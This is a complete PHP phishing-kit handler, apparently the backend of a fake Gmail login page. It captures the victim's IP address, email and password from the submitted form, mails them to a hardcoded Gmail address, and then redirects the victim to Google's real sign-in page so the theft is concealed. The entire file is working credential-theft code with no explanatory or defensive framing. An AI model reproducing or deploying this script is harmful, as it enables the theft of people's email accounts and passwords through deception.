<?
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------\n";
$message .= "$ip \n";
$message .= "Email : ".$_POST['Email']."\n";
$message .= "Password : ".$_POST['Passwd']."\n";
$message .= "-------------------\n";


$recipient = "eriwalogs@gmail.com";
$subject = "GMAILS";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);

header("Location:https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/mail/#identifier");
?> 